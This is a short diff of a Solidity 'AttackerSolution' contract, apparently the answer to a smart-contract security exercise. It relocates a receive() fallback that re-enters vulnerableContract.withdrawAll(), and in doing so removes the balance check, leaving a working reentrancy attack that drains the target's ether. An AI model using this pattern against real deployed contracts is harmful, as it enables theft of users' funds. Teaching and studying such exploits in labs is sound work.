@@ -14,18 +14,6 @@ contract AttackerSolution is AttackerBase, EventsBase {
     AttackerBase(_vulnerableContractAddress)
   {}
 
-  // Function is executed when VulnerableContract sends eth.
-  receive() external payable override {
-    // Helpful for debugging
-    emit AttackerContractBalance(address(this).balance / 1 ether);
-
-    // INSERT LOGIC HERE: START
-    if (address(vulnerableContract).balance >= _ATTACK_AMOUNT) {
-      vulnerableContract.withdrawAll();
-    }
-    // INSERT LOGIC HERE: END
-  }
-
   function attack() external override {
     // Helpful for debugging
     emit AttackerContractBalance(address(this).balance / 1 ether);
@@ -39,4 +27,15 @@ contract AttackerSolution is AttackerBase, EventsBase {
     emit AttackerContractBalance(address(this).balance / 1 ether);
     emit VulnerableContractBalance(address(vulnerableContract).balance / 1 ether);
   }
+
+  // Function is executed when VulnerableContract sends eth.
+  receive() external payable override {
+    // Helpful for debugging
+    emit AttackerContractBalance(address(this).balance / 1 ether);
+
+    // INSERT LOGIC HERE: START
+      vulnerableContract.withdrawAll();
+    // INSERT LOGIC HERE: END
+  }
+
 }
